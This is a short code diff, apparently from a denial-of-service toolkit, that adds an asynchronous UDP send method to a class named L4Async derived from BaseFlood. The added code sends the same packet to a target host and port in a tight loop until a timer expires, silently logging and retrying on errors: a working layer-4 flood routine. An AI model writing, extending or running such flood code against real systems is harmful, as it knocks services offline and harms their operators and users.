@@ -139,6 +139,20 @@ class L4Async(BaseFlood):
     def TCP(self) -> None:
         self._run_async(self._send_tcp_async())
 
+    async def _send_udp_async(self, message: bytes) -> None:
+        loop = asyncio.get_event_loop()
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setblocking(False)
+        try:
+            while not self._is_expired():
+                try:
+                    await loop.sock_sendto(sock, message, (self.endpoint.host, self.endpoint.port))
+                except Exception:
+                    logger.debug("L4 UDP send failed")
+                    await asyncio.sleep(0.1)
+        finally:
+            sock.close()
+
     def UDP(self, message: bytes = b"hello") -> None:
         self._run_async(self._send_udp_async(message))
 
